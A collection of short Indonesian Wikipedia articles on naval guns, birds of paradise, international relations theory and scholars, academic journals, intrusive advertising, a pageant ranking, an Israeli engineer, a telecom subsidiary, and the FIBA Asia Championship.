<doc id="1751292" url="https://id.wikipedia.org/wiki?curid=1751292" title="4.5 inch Mark 8 naval gun">
4.5 inch Mark 8 naval gun

4,5 inch Mark 8 adalah sistem senjata angkatan laut Inggris yang saat ini melengkapi kapal perusak dan fregat Angkatan Laut Kerajaan Inggris, dan beberapa kapal perusak Inggris dan frigat yang dijual ke negara lain.

Senjata 4,5 inci telah menjadi standar kaliber menengah dari Royal Navy untuk digunakan melawan target permukaan, pesawat terbang dan pantai sejak 1938. Saat ini 55-kaliber Mark 8 gun menggantikan senjata angkatan laut era Perang Dunia II 45 kaliber QF 4,5 inci Mk I - V. Seperti semua senjata angkatan laut 4,5 inch Inggris, itu benar-benar memiliki kaliber 4,45 inci (113 mm).



</doc>
<doc id="1751295" url="https://id.wikipedia.org/wiki?curid=1751295" title="Cenderawasih Raja Belanda">
Cenderawasih Raja Belanda

Cenderawasih Raja Belanda, juga dikenal sebagai Cenderawasih Raja Willem III atau raja kecil yang indah, adalah burung yang lahir dari kawin silang antara cenderawasih belah rotan dan cenderawasih raja.

Setidaknya 26 spesimen dewasa muda spesies ini ada di berbagai koleksi, termasuk Museum Sejarah Alam Amerika dan Museum Manchester, yang terutama berasal dari pantai utara Papua maupun tempat lain yang belum dikenal. Hewan ini disebutkan sebagai spesies baru oleh Adolf Bernard Meyer pada tahun 1875 dan didiagnosis sebagai hibrida oleh Jacques Berlioz pada tahun 1927.



</doc>
<doc id="1751297" url="https://id.wikipedia.org/wiki?curid=1751297" title="Cenderawasih belah rotan">
Cenderawasih belah rotan

Cenderawasih belah rotan ("Cicinnurus magnificus") adalah burung dalam familia Paradisaeidae yang termasuk dalam burung pengicau. IUCN mengkategorikan spesies ini sebagai risiko rendah.

Cenderawasih belah rotan terbagi atas 3 subspesies:


</doc>
<doc id="1751305" url="https://id.wikipedia.org/wiki?curid=1751305" title="Biaya audiensi">
Biaya audiensi

Biaya audiensi adalah istilah dalam teori hubungan internasional untuk menyebut hukuman yang diterima seorang pemimpin dari rakyatnya apabila ia memicu krisis kebijakan luar negeri dan tidak mau bertanggung jawab. Istilah ini dipopulerkan dalam sebuah artikel akademik tahun 1994 oleh James Fearon.


</doc>
<doc id="1751306" url="https://id.wikipedia.org/wiki?curid=1751306" title="Isolasionisme">
Isolasionisme

Isolasionisme adalah kebijakan luar negeri yang diterapkan oleh pemimpin yang merasa kepentingan dalam negerinya jauh lebih utama daripada kepentingan luar negeri. Salah satu alasan membatasi keterlibatan internasional adalah menghindari keterlibatan dalam konflik yang berbahaya dan tak diinginkan. Selain itu ada juga manfaat menarik diri dari perjanjian perdagangan internasional atau perjanjian bantuan bersama.

Sejak 1641 sampai 1853, keshogunan Tokugawa di Jepang menerapkan kebijakan "kaikin". Kebijakan ini melarang kontak dengan sebagian besar negara asing. Klaim bahwa Jepang sepenuhnya terisolasi justru keliru. Faktanya, Jepang membina hubungan dagang dan diplomatik terbatas dengan Tiongkok, Korea, Kepulauan Ryukyu, dan Belanda.

Kebudayaan Jepang berkembang hampir tanpa pengaruh asing. Jepang juga pernah mengalami masa damai terlama sepanjang sejarah. Pada waktu itu, Jepang membangun kota dan perkampungan padat dan meningkatkan komodifikasi pertanian dan perdagangan dalam negeri, tenaga kerja yang diupah, mencanangkan program melek huruf dan budaya menulis, dan merintis modernisasi meskipun keshogunan Tokugawa melemah.

Meski sejumlah ilmuwan seperti Robert J. Art percaya bahwa Amerika Serikat memiliki riwayat isolasionisme, ilmuwan lainnya membantah klaim tersebut dan menyatakan bahwa Amerika Serikat mengambil strategi unilateralisme atau non-intervensionisme. Robert Art memaparkan pendapatnya dalam "A Grand Strategy for America" (2003). Buku-buku yang berpendapat bahwa Amerika Serikat menerapkan unilateralisme alih-alih isolasionisme adalah "Promised Land, Crusader State" karya Walter A. McDougall (1997), "Surprise, Security, and the American Experience" karya John Lewis Gaddis (2004), dan "Acting Alone" karya Bradley F. Podliska (2010). Kedua belah pihak menggunakan Pidato Perpisahan George Washington sebagai bukti atas pendapatnya masing-masing.





</doc>
<doc id="1751320" url="https://id.wikipedia.org/wiki?curid=1751320" title="Jack Finegan">
Jack Finegan

Jack Finegan () adalah seorang sarjana Alkitab dan "Professor Emeritus of New Testament History and Archaeology" pada , Berkeley, California, Amerika Serikat. Ketika menjadi profesor pada Iowa State University di Ames, Iowa, ia menerbitkan buku "Light from the Ancient Past" pada tahun 1946. Ia dikenal karena pandangannya terhadap kronologi Alkitab.



</doc>
<doc id="1751452" url="https://id.wikipedia.org/wiki?curid=1751452" title="Dikotomi Timur–Barat">
Dikotomi Timur–Barat

Dalam sosiologi, dikotomi Timur–Barat adalah persepsi perbedaan antara dunia Timur dan kebudayaan Barat. Karena berbeda budaya alih-alih geografinya, batas Timur dan Barat masih tidak jelas dan tergantung kriteria para pihak yang menggunakan istilah ini. Sejak dulu, Asia dan negara-negara Islam dikelompokkan sebagai Timur, sedangkan Australia, Kanada, Eropa, Selandia Baru, dan Amerika Serikat dikelompokkan sebagai Barat. Istilah ini digunakan dalam studi manajemen, ekonomi, dan ilmu bahasa. Konsep ini dikritik karena tidak mempertimbangkan hibriditas kawasan.

Dalam konsepnya, batas Timur dan Barat bersifat kultural, bukan geografis. Karena itu pula, Australia masuk kelompok Barat dan negara-negara Islam di manapun letaknya masuk kelompok Timur. Batas budaya seperti ini sulit ditetapkan di daerah-daerah yang kebudayaannya beragam seperti Bosnia dan Herzegovina; wargannya dapat menyatakan dirinya sebagai bagian dari Timur atau Barat sesuai latar etnis atau agamanya. Selain itu, penduduk di wilayah lain melihat batas budaya ini dari sudut pandang yang berbeda. Misalnya, sejumlah ilmuwan Eropa mendefinisikan Rusia sebagai bagian dari Timur, tetapi banyak ilmuwan yang sepakat bahwa Rusia adalah wilayah pelengkap Barat kedua, Contoh lainnya, negara-negara Islam menganggap Rusia dan negara yang didominasi penganut Kristen sebagai bagian dari Barat.

Balancing the East, Upgrading the West; U.S. Grand Strategy in an Age of Upheaval by Zbigniew Brzezinski January/February 2012 Foreign Affairs


</doc>
<doc id="1751456" url="https://id.wikipedia.org/wiki?curid=1751456" title="WorldCat">
WorldCat

WorldCat adalah suatu yang mencatat isi koleksi 72.000 perpustakaan di 170 negara dan teritori yang termasuk ke dalam koperasi global Online Computer Library Center (OCLC). Dioperasikan oleh OCLC Online Computer Library Center, Inc. sementara databasenya dipelihara secara kolektif oleh perpustakaan anggotanya.

OCLC didirikan tahun 1967, dan pada tahun yang sama mendirikan WorldCat, meskipun catatan katalog pertama ditambahkan pada tahun 1971. Memuat lebih dari 330 juta catatan, mewakili lebih dari 2 milyar aset fisik dan digital dalam 485 bahasa, .




</doc>
<doc id="1751568" url="https://id.wikipedia.org/wiki?curid=1751568" title="Non-intervensionisme">
Non-intervensionisme

Nonintervensi atau non-intervensionisme adalah kebijakan luar negeri yang menyatakan bahwa seorang pemimpin politik harus menghindari hubungan dengan negara lain sambil mempertahankan diplomasi dan tidak terlibat perang yang tidak bersifat mempertahankan diri. Definisi nonintervensi yang lebih resmi adalah kebijakan tidak adanya "campur tangan oleh sebuah negara atau beberapa negara dalam urusan luar negeri negara lain tanpa izin, atau urusan dalam negerinya dengan izin atau tanpa izin."

Kebijakan ini didasarkan pada kepercayaan bahwa sebuah negara tidak boleh ikut campur dalam politik dalam negeri negara lain serta prinsip-prinsip kedaulatan negara dan penentuan nasib sendiri. Frasa yang mirip nonintervensi dalah "kemerdekaan strategis". Para pendukung non-intervensionisme meliputi Presiden Amerika Serikat George Washington dan Thomas Jefferson; keduanya mendukung nonintervensi pada peperangan di Eropa namun mempertahankan perdagangan bebas dengan Eropa. Pendukung lainnya adalah Senator Amerika Serikat Robert A. Taft dan Anggota Kongres Amerika Serikat Ron Paul.

Nonintervensi berbeda dengan isolasionisme. Para pendukung isolasionisme dapat dibedakan dari pendukung non-intervensionisme dengan melihat pandangan mereka terhadap nasionalisme ekonomi (proteksionisme) dan pengetatan imigrasi. Non-intervensionisme adalah kebijakan pemerintah dan tidak mencakup intervensi lembaga swadaya masyarakat seperti Amnesty International.





</doc>
<doc id="1751570" url="https://id.wikipedia.org/wiki?curid=1751570" title="James Fearon">
James Fearon

James D. Fearon adalah Dosen Ilmu Politik Theodore dan Francis Geballe dari Amerika Serikat. Ia dikenal atas tulisan-tulisannya mengenai teori perang saudara, daya tawar internasional, masalah pemborosan perang, dan biaya audiensi. Ia mendapatkan gelar BA dari Universitas Harvard dan PhD dari Universitas California, Berkeley.

Tulisan Fearon mengenai perang menekankan bahwa ilmuwan perlu menjelaskan mengapa negara rasional malah terlibat dalam perang alih-alih memanfaatkan daya tawarnya, padahal daya tawar dapat membuat kedua pihak menyelesaikan pertentangannya dengan damai. Ia juga menjelaskan mengapa negara-negara demokratis lebih mampu menyatakan keinginannya dalam perang berkat biaya audiensi dalam negeri. Fearon juga memberi sumbangsih pada studi demokrasi deliberatif.

Fearon memaparkan tiga asumsi dasar mengenai perang. Pertama, perang adalah pilihan yang lebih boros daripada perdamaian. Kedua, perang dapat dipastikan tak dapat dipastikan ("predictably unpredictable"). Dengan kata lain, walaupun tidak ada pihak yang tahu siapa yang akan menang, mereka sama-sama yakin bahwa masing-masing pihak akan menang. Ketiga, tidak ada manfaat langsung yang dapat diambil dari perang. Fearon menyebut teorinya sebagai masalah pemborosan perang.

Ilmuwan konstruktivis Marc Lynch menjuluki Fearon "tokoh rasionalis berpengaruh" dalam teori hubungan internasional dan mengakuinya (bersama konstruktivis Alexander Wendt) sebagai tokoh yang mengakhiri perdebatan teori rasionalis versus konstruktivis.

Sejak 2011, Fearon merupakan anggota dewan Peace Research Endowment.



</doc>
<doc id="1751581" url="https://id.wikipedia.org/wiki?curid=1751581" title="Bofors 120 mm gun">
Bofors 120 mm gun

Senjata otomatis Bofors 120 mm adalah senjata kegunaan ganda angkatan laut. Pada awalnya digunakan kapal kapal kelas Halland dan Angkatan Laut Kolombia 7 de Agosto (D-06) dan 20 de Junio (D-05). Senjata juga digunakan pada kelas Holland Belanda dan kapal perusak kelas Friesland, dan kemudian frigat kelas Tromp.



</doc>
<doc id="1751582" url="https://id.wikipedia.org/wiki?curid=1751582" title="Meriam Bofors 152 mm">
Meriam Bofors 152 mm

Senjata Bofors 152 mm adalah senjata angkatan laut. Pada awalnya digunakan kapal kapal penjelajah ringan dan kapal penjelajah termasuk Swedia kelas Tre Kronor dan kelas Belanda De Zeven Provincien, setelah Perang Dunia II. Senjata ini masih digunakan pada Peru Angkatan Laut cruiser BAP Almirante Grau dan saat senjata angkatan laut terbesar masih dalam dinas aktif.

Senjata 152 mm pertama kali dirancang pada tahun 1939 oleh Bofors untuk Koninklijke Marine cruiser Kijkduin, akhirnya bernama De Zeven Provincien. Setelah invasi Jerman ke Belanda pada tahun 1940 artileri tersebut disita oleh Pemerintah Swedia dan ditempatkan pada kapal penjelajah Swedia HSwMS Tre Kronor.



</doc>
<doc id="1751584" url="https://id.wikipedia.org/wiki?curid=1751584" title="Bofors 57 mm gun">
Bofors 57 mm gun

Senjata Bofors 57 mm adalah serangkaian senjata angkatan laut dual kegunaan yang dirancang dan diproduksi oleh produsen senjata Swedia AB Bofors (sejak Maret 2005 bagian dari BAE Systems AB), yang dirancang pada tahun 1964 sebagai revisi dari 57 mm lvakan M / 50 digunakan pada perusak kelas Halland. Produksi awal varian 57 mm Mark 1 mulai pada tahun 1966 dan pada awalnya digunakan untuk melengkapi kapal patroli pantai kecil dan serangan cepat. Senjata yang dikendalikan dari jauh, biasanya dengan komputer kontrol tembakan tetapi, sebagai ukuran redundansi, kru juga dapat melatih dan bertujuan pistol menggunakan panel instrumen yang baik pada atau di kontak langsung dengan senjata. Meskipun Angkatan Laut Swedia adalah pengguna utama dari pistol, telah diekspor secara luas oleh Bofors Defense untuk digunakan oleh angkatan laut dari Brunei, Kanada, Kroasia, Finlandia, Indonesia, Irlandia, Malaysia, Meksiko, Montenegro, Singapura, Thailand dan Amerika Serikat.

Senjata ditingkatkan dan diperbaiki beberapa kali, pertama Mark 2 pada tahun 1981 yang secara drastis menurunkan berat badan serta memperkenalkan stabilisator servo baru. Mark 3 datang pada tahun 1995 dengan modifikasi yang dilakukan untuk mengaktifkan amunisi pintar yang dikembangkan.


Video



</doc>
<doc id="1751588" url="https://id.wikipedia.org/wiki?curid=1751588" title="Masmun Yan Manggesa">
Masmun Yan Manggesa

Marsekal Muda TNI (Purn.) Masmun Yan Manggesa () adalah tokoh militer Indonesia. Ia seorang purnawirawan perwira tinggi TNI AU, dengan jabatan terahkir sebagai Asisten Pengamanan Kasau. Sebelumnya ia pernah menjabat sebagai Wakil Asisten Pengamanan Kasau.

Ia diterima menjadi calon Prajurit Taruna, dan dilantik sebagai Letnan Dua pada tahun 1983 sebagai Lulusan Terbaik dan berhak atas Medali Adhi Makayasa. Mengikuti PPSA Lemhanas pada tahun 2011. Pada tanggal 27 Januari 2015 dilantik menjadi Aspam Kasau sampai 2016.

Setelah pensiun dari militer, ia diangkat menjadi pejabat teras di Kementerian Koordinator Bidang Pembangunan Manusia dan Kebudayaan (Kemenko PMK), tepatnya sebagai Deputi Bidang Koordinasi Kerawanan Sosial dan Dampak Bencana Kemenko PMK. Yan Manggesa dilantik pada tanggal 24 Mei 2016 oleh Menteri Koordinator Bidang Pembangunan Manusia dan Kebudayaan, Puan Maharani, ia menggantikan posisi yang sebelumnya dijabat oleh Willem Rampangilei.



</doc>
<doc id="1751589" url="https://id.wikipedia.org/wiki?curid=1751589" title="Rumpun bahasa Sumba">
Rumpun bahasa Sumba

Rumpun bahasa Sumba adalah salah satu kelompok dari rumpun bahasa Melayu-Polinesia Tengah, yang terdiri dari bahasa-bahasa yang saling berhubungan dekat. Bahasa yang paling banyak penuturnya dalam kelompok ini adalah bahasa Kambera, yang memiliki seperempat juta penutur di belahan timur Pulau Sumba. Bahasa Hawu di Pulau Sabu diperkirakan memiliki substratum non-Austronesia, tetapi kemungkinan tidak lebih banyak bila dibandingkan dengan bahasa-bahasa lainnya di Flores tengah dan timur, misalnya bahasa Sikka; atau dengan anggota lain pada umumnya dari rumpun bahasa Melayu-Polinesia Tengah.

Bahasa-bahasa dalam rumpun bahasa Sumba semuanya berhubungan dekat. Blust (2009) menemukan dukungan penuh dalam hubungan antara bahasa Sumba dengan bahasa Hawu, yaitu bahasa yang paling divergen.


</doc>
<doc id="1751592" url="https://id.wikipedia.org/wiki?curid=1751592" title="Etika nuklir">
Etika nuklir

Etika nuklir adalah bidang akademik dan studi kebijakan lintas disiplin yang mempelajari perang nuklir, deterensi nuklir, pengendalian senjata nuklir, persenjataan nuklir, atau energi nuklir lewat satu atau beberapa teori etika dan moralitas. Dalam studi keamanan kontemporer, permasalahan perang nuklir, deterensi, proliferasi, dan lainnya biasa dipahami dalam lingkup politik, strategi, atau militer. Dalam studi organisasi dan hukum internasional, permasalahan ini juga dipelajari dalam lingkup hukum. Etika nuklir menyatakan bahwa kemungkinan kepunahan manusia, kehancuran massal manusia, atau kerusakan lingkungan massal akibat perang nuklir merupakan persoalan etika atau moral yang mendalam. Teori ini secara spesifik menyatakan bahwa kepunahan manusia, kehancuran massal manusia, atau kerusakan lingkungan tergolong sebagai kejahatan moral. Etika nuklir turut mempersoalkan generasi masa depan dan beban yang diakibatkan oleh limbah dan polusi nuklir. Sejumlah akademisi menyimpulkan bahwa mengambil tindakan yang memicu persoalan tersebut salah secara moral, artinya terlibat dalam perang nuklir dianggap salah secara moral.

Etika nuklir mengupas kebijakan deterensi nuklir, pengendalian dan pelucutan senjata nuklir, dan energi nuklir selama masih terkait dengan penyebab atau pencegahan perang nuklir. Alasan etis deterensi nuklir, misalnya, menyoroti peran deterensi dalam mencegah perang nuklir antara negara-negara besar sejak Perang Dunia II berakhir. Sejumlah ilmuwan mengklaim bahwa deterensi nuklir adalah tanggapan yang rasional secara moral terhadap dunia yang penuh senjata nuklir. Sebaliknya, kritik moral deterensi nuklir justru menyoroti kemungkinan pelanggaran hak asasi manusia dan hak-hak demokratis.


</doc>
<doc id="1751593" url="https://id.wikipedia.org/wiki?curid=1751593" title="Barry Buzan">
Barry Buzan

Barry Gordon Buzan (lahir 28 April 1946) adalah Dosen Hubungan Internasional Emeritus di London School of Economics dan dosen kehormatan di Universitas Kopenhagen dan Universitas Jilin. Ia menjabat sebagai Dosen Hubungan Internasional Montague Burton di LSE sampai tahun 2012. Buzan merancang teori kompleks keamanan regional dan menjadi tokoh utama Mazhab Kopenhagen bersama Ole Wæver.

Sejak 1988 sampai 2002, ia menjabat sebagai direktur proyek di Copenhagen Peace Research Institute (COPRI). Pada tahun 1995 sampai 2002, ia merupakan Dosen Studi Internasional di Universitas Westminster, dan sebelumnya di Universitas Warwick. Sepanjang tahun 1993, ia menjadi dosen tamu di Universitas Internasional Jepang, dan pada tahun 1997-1998 ia menjadi Dosen Tamu Olof Palme di Swedia.

Ia merupakan Ketua British International Studies Association tahun 1988-90, Wakil Presiden International Studies Association Amerika Utara tahun 1993-94, dan sekretaris pendiri International Studies Coordinating Committee tahun 1994-98. Pada tahun 1999 sampai 2011, ia merupakan koordinator proyek perumusan teori hubungan internasional mazhab Inggris, dan tahun 2004-8 ia menjabat sebagai redaktur "European Journal of International Relations". Pada tahun 1998, ia diangkat menjadi anggota British Academy, dan pad atahun 2001 ia menjadi anggota Academy of Learned Societies for the Social Sciences.

Buzan melakukan penelitian di bidang:

Karya-karya terpenting Buzan adalah:

Barry Buzan lahir di London, kemudian pindah bersama keluarganya ke Kanada pada tahun 1954. Ia memegang kewarganegaraaan Britania Raya dan Kanada. Buzan merupakan lulusan Universitas British Columbia (1968) dan tidak melanjutkan program S2 di sana. Ia mendapatkan gelar doktoralnya di London School of Economics (1973). Ia mengaku memiliki pandangan politik "demokrat sosial" dan memegang kepercayaan "sekularis ekstrem".

Istri Buzan, Deborah Skinner, adalah seorang seniman dan putri bungsu psikolog B. F. Skinner. Mereka tidak memiliki anak. Penulis peta pikiran Tony Buzan adalah kakaknya; Tony dan Barry sama-sama menulis "The Mind Map Book".


</doc>
<doc id="1751595" url="https://id.wikipedia.org/wiki?curid=1751595" title="Amitav Acharya">
Amitav Acharya

Amitav Acharya (lahir 1962) adalah akademisi Kanada kelahiran India dan dosen hubungan internasional di American University, Washington, D.C. Ia menjabat sebagai Ketua Tantangan dan Pemerintahan Transnasional UNESCO di School of International Service dan ketua ASEAN Studies Center.

Bidang penelitian Acharya meliputi:

Acharya dikenal sebagai pengusung kerangka kerja "lokalisasi" dan "subsidiaritas" untuk mempelajari percampuran ide dan norma dalam politik dunia, dan dikenal atas tulisannya mengenai "teori hubungan internasional non-Barat". Ia juga merupakan pakar keamanan Asia Tenggara, regionalisme Asia, dan penerapan teori-teori HI di Asia.


</doc>
<doc id="1751597" url="https://id.wikipedia.org/wiki?curid=1751597" title="World Politics">
World Politics

World Politics adalah jurnal akademik telaahan sejawat triwulan yang membahas ilmu politik dan hubungan internasional. Jurnal ini diterbitkan oleh Cambridge University Press atas nama Princeton Institute for International and Regional Affairs. Jurnal ini disponsori oleh Yale Institute of International Studies sampai tahun 1951, kemudian Princeton's Center of International Studies sampai tahun 2003. Jurnal ini dirintis tahun 1948 dan pemimpin redaksinya saat ini adalah Deborah J. Yashar (Universitas Princeton). Menurut "Journal Citation Reports" 2012, jurnal ini memiliki faktor pengaruh sebesar 2,308.



</doc>
<doc id="1751599" url="https://id.wikipedia.org/wiki?curid=1751599" title="International Organization">
International Organization

International Organization adalah jurnal akademik telaahan sejawat yang membahas seluruh bidang hubungan internasional. Bidang-bidang utamanya meliputi kebijakan luar negeri, hubungan internasional, ekonomi politik internasional dan komparatif, kebijakan keamanan, permasalahan lingkungan dan penyelesaiannya, integrasi Eropa, pola aliansi dan perang, daya tawar dan resolusi konflik, pembangunan ekonomi dan penyesuaian, dan pergerakan modal internasional.

Jurnal ini diterbitkan oleh Cambridge University Press atas nama International Organization Foundation.

Pemimpin redaksinya saat ini adalah Jon Pevehouse, dosen ilmu politik di Universitas Wisconsin–Madison.

Dalam survei tahun 2005, 1.084 ilmuwan hubungan internasional diajukan pertanyaan "Jurnal manakah yang menerbitkan artikel yang berdampak pada cara pikir ilmuwan hubungan internasional mengenai subjek dan karya mereka?" untuk dijadikan daftar empat jurnal terbaik secara nominal. Dari 749 responden, 521 (≈70%) menjawab "IO". "International Studies Quarterly" berada di peringkat kedua dengan 371 (≈50%) jawaban.



</doc>
<doc id="1751602" url="https://id.wikipedia.org/wiki?curid=1751602" title="Iklan peralihan">
Iklan peralihan

Iklan peralihan atau disebut juga dengan iklan serobot (bahasa Inggris: "intrusive advertising") adalah sebuah metode beriklan dengan pendekatan aktif dan asertif atau cenderung agresif "menyapa" konsumen. Hal ini berlawanan dengan metode pasif yang beriklan untuk pelanggan yang membutuhkan suatu produk atau jasa atau bisa dikatakan pelanggan lah yang mencari iklan. Contoh iklan peralihan dapat ditemukan di media cetak maupun elektronik seperti koran, televisi, situs daring, dan lain-lain. Metode iklan serobot menuai kontroversi di beberapa negara karena cara yang digunakan terkadang tidak lazim dan melanggar kode etik.

Cara sebuah iklan peralihan bekerja bervariasi, mulai dari menyelinap ke dalam pikiran konsumen hingga secara terang-terangan muncul berhadapan langsung dengan konsumen. Iklan serobot yang menyelinap secara perlahan bekerja dengan mempengaruhi konsumen di tengah berjalannya siaran acara. Sementara itu, iklan serobot yang berhadapan langsung dapat muncul secara tiba-tiba dan terkadang tidak relevan dengan konten yang disajikan. Kesan yang dihadirkan seakan-akan "memaksa" konsumen untuk memperhatikan sebuah iklan.
Di Indonesia, iklan peralihan menuai perseteruan dan kontroversi dengan pihak yang terlibat di antaranya pemerintah Republik Indonesia sebagai mediator, dua operator telekomunikasi Indonesia sebagai pelaku iklan peralihan, dan dua asosiasi periklanan digital sebagai protestor.

Perseteruan terjadi pada tahun 2013 ketika laman situs dari anggota Indonesia Digital Association (IDA) dan E-Commerce Indonesia (idEA) disusupi iklan peralihan milik XL Axiata dan Telkomsel. Metode iklan peralihan yang digunakan oleh kedua operator tersebut adalah "interstitial ads" dan "off-decks ads". Jenis yang pertama adalah penyediaan halaman iklan penuh sebelum membuka halaman baru, dan yang kedua adalah format iklan berupa papan di situs laman tujuan.

Baik idEA dan IDA menuntut agar XL dan Telkomsel mencabut iklan serobot di beberapa situs anggota mereka, tetapi kedua operator itu menolak dengan alasan mereka berhak beriklan karena jaringan internet dan infrastrukturnya adalah milik mereka. Kasus tersebut hingga pada tahun 2015 masih menggantung, tetapi IDA dan idEA bertindak dengan membuat petisi daring di situs change.org dan berharap menteri komunikasi Indonesia angkat bicara.


</doc>
<doc id="1751606" url="https://id.wikipedia.org/wiki?curid=1751606" title="Ranking Provinsi di Putri Pariwisata Indonesia">
Ranking Provinsi di Putri Pariwisata Indonesia

Berikut ini adalah tabel provinsi - provinsi di Indonesia yang pernah menempati posisi di Putri Pariwisata Indonesia berdasarkan tahun 2008 sampai 2014
Bengkulu, Kalimantan Tengah, Kalimantan Utara, Kalimantan Selatan, Sulawesi Selatan, Sulawesi Tenggara, Sulawesi Tengah, Sulawesi Barat, dan Maluku Utara pernah mengikuti Putri Pariwisata Indonesia setidaknya satu kali, namun tidak pernah menempati posisi.

Catatan: Pada tahun 2008 hanya ada 1 perwakilan DKI Jakarta. Dalam tabel ini, perwakilan tersebut dimasukkan dalam perwakilan DKI Jakarta 1.

(1) http://megapolitan.kompas.com/read/2010/10/23/09243641/Inilah.Putri.Pariwisata.Indonesia.2010

(2) http://lifestyle.okezone.com/read/2011/09/25/407/506686/melisa-putri-pariwisata-indonesia-2011

(3) http://www.tribunnews.com/seleb/2012/09/29/dokter-muda-ini-sekarang-jadi-putri-pariwisata-2012

(4) http://www.tribunnews.com/seleb/2013/09/20/inilah-10-besar-finalis-putri-pariwisata-wakil-kalimantan-dan-sulawesi-kandas

(5) http://www.tribunnews.com/seleb/2013/09/20/foto-senyum-pertama-nabilla-shabrina-menangi-pemilihan-putri-pariwisata-indonesia-2013

(6) http://indonesianpageants.com/national/putri-pariwisata-indonesia/syarifah-fajri-maulidiyah-putri-pariwisata-indonesia-2014/

(7) http://travel.detik.com/read/2014/11/21/070404/2754889/1382/ini-dia-si-cantik-puteri-pariwisata-indonesia-2014


</doc>
<doc id="1751615" url="https://id.wikipedia.org/wiki?curid=1751615" title="Simcha Blass">
Simcha Blass

Simcha Blass (atau Symcha Blass, atau Simkha Blass); 27 November 1897 – 18 Juli 1982; ) adalah seorang teknisi dan penemu Israel. Ia adalah figur utama dari pengembangan air di Israel, inisiator, pengenal dan pengembang sistem irigasi tetes yang baru, penemu alat tetes yang baru (bersama dengan putranya Yeshayahu).

Simcha Blass lahir di Warsawa, Polandia, yang kemudian menjadi bagian dari Kekaisaran Rusia, dari sebuah keluarga Yahudi Ortodoks. Ia aktif di unit-unit pertahanan diri Yahudi yang dibentuk di Warsawa untuk mempertahankan Yahudi pada akhir Perang Dunia I. Pembelajaran tekniknya di Warsawa diinterupsikan oleh Perang Polandia-Soviet dan selesai setelah perang. Pada perang tersebut, ia direkrut ke Angkatan Darat Polandia, disana ia membuat penemuan untuk Angkatan Udara Polandia.




</doc>
<doc id="1751775" url="https://id.wikipedia.org/wiki?curid=1751775" title="Pascarealisme">
Pascarealisme

Pascarealisme adalah sudut pandang teori hubungan internasional. Menurut pascarealisme, aktor-aktor global merupakan bagian dari aringan pikiran, tindakan, dan diskusi global. Pascarealisme berfokus pada diskusi, diskursus, dan perdebatan dalam pelaksanaan dan studi hubungan internasional. Bagi kaum pascarealis, realisme internasional adalah bentuk retorika politik dan ilmu sosial. Pascarealisme memicu perdebatan mengenai hal yang nyata dan hal yang realistis dalam hubungan internasional.



</doc>
<doc id="1751777" url="https://id.wikipedia.org/wiki?curid=1751777" title="International Relations Theory and the Third World">
International Relations Theory and the Third World

International Relations Theory and the Third World adalah koleksi esai teori hubungan internasional dari sudut pandang aktor non-adidaya. Buku ini disunting oleh Prof. Stephanie Neuman dan diterbitkan tahun 1998 oleh St. Martin's Press. Buku ini merupakan salah satu publikasi besar pertama yang membahas teori dunia ketiga. Robert Jervis menyebut esai dalam buku ini "informatif dan provokatif".





</doc>
<doc id="1751779" url="https://id.wikipedia.org/wiki?curid=1751779" title="PINS">
PINS

PINS atau PT PINS INDONESIA adalah anak perusahaan dari PT Telekomunikasi Indonesia yang bergerak di bidang "Internet of Things" (IoT). Berdiri pada tahun 1995, PINS memiliki pengalaman di bidang telekomunikasi selama lebih dari 20 tahun yang memposisikan perseroan sebagai perusahaan penyedia sarana dan prasarana layanan telekomunikasi terlengkap dan tepercaya di seluruh Nusantara.. PINS Indonesia memiliki 3 bisnis portfolio yaitu IoT Service, Mobility Service, dan CPE Manage Service. Hingga pada tahun 2015, mitra bisnis PINS di antaranya adalah Cisco, HP, Samsung, ZTE, Huawei, LG, dan Palo Alto. Dari ajajaran Direksi saat ini PINS Indonesia dipimpin oleh Prasabri Pesti sebagai CEO.

PINS berdiri sejak tanggal 17 Oktober 1995 dengan nama PT. Pramindo Ikat Nusantara. Pada awalnya fokus bisnis Perseroan adalah untuk menyelenggarakan Kerja Sama Operasi (KSO) telekomunikasi di wilayah Sumatra.Pada tahun 2002, saham Perseroan seluruhnya diambil alih oleh PT. Telekomunikasi Indonesia Tbk (TELKOM), sebuah perusahaan telekomunikasi terbesar di Indonesia, dan mengacu pada CSS TELKOM maka mulai Oktober 2010 Perseroan memfokuskan diri pada portofolio Premise Integration Service. Perubahan nama perusahaan dari PT. Pramindo Ikat Nusantara menjadi PT. PINS INDONESIA ini dikukuhkan tanggal 20 Desember 2012.Pada tahun 2016, PINS Indonesia adalah perusahaan yang aktif dalam bisnis integrasi perangkat, jaringan, sistem dan proses menggunakan konsep Internet of Things (IoT) dengan kemampuan sumber daya manusia dan kapabilitas kesisteman yang terbaik. PINS Indonesia mempunyai tagline “The IoT Comapany”.

Pada tahun 2015 BIsnis Portfolio PINS di bagi menjadi 3 yaitu, IoT Service, Mobility Service, dan CPE Manage Service.

Pada tahun 2013, PINS mendapatkan revenue sebesar Rp. 1 triliun, pada tahun 2014 revenue PINS meningkat 50% menjadi Rp 1,5 triliun dan pada tahun 2015 PINS mencatatkan revenue Rp. 2,4 triliun atau meningkat 60% dari tahun sebelumnya.

Pada tahun 2014 PT Telekomunikasi Indonesia melalui PINS menuntaskan akuisisi 25% saham PT Tiphone Mobile Indonesia Tbk (TELE) dengan total nilai transaksi mencapai Rp 1,39 triliun. Pembelian saham tersebut dilakukan melalui dua tahap. Pertama, pada 11 September 2014, PINS mengakuisisi 1,11 miliar saham (15 persen) Tiphone senilai Rp 876,7 miliar dari Boquete Group SA, Interventures Capital Ltd, PT Sinarmas Asset Management, dan Top Dollar Investment Ltd.

Selanjutnya, PINS membeli 10 persen saham Tiphone melalui penambahan modal tanpa hak memesan efek terlebih dahulu (non-HMETD). Uang yang digelontorkan untuk membeli besaran saham tersebut adalah Rp 518,23 miliar. Dana yang didapat oleh PINS berasal dari kas internal Telkom dan PINS Indonesia.


</doc>
<doc id="1751782" url="https://id.wikipedia.org/wiki?curid=1751782" title="Kejuaraan Asia FIBA">
Kejuaraan Asia FIBA

Kejuaraan FIBA Asia untuk Pria (awalnya Kejuaraan Konfederasi Basket Asia) adalah sebuah turnamen basket internasional yang diadakan setiap dua tahun antara tim nasional pria Asia. Kejuaraan tersebut adalah turnamen kualifikasi Asia untuk Piala Dunia Basket FIBA dan turnamen basket Olimpiade. 2013 dan 2015 menjadi Kejuaraan Asia yang terakhir yang dijadikan sebagai kejuaraan kualifikasi untuk Piala Dunia Basket FIBA dan Permainan Olimpiade.

Kejuaraan Asia FIBA 2017 akan menjadi Kejuaraan Asia yang terakhir yang diadakan karena kejuaraan tersebut akan diformasikan ulang pada 2021.






</doc>
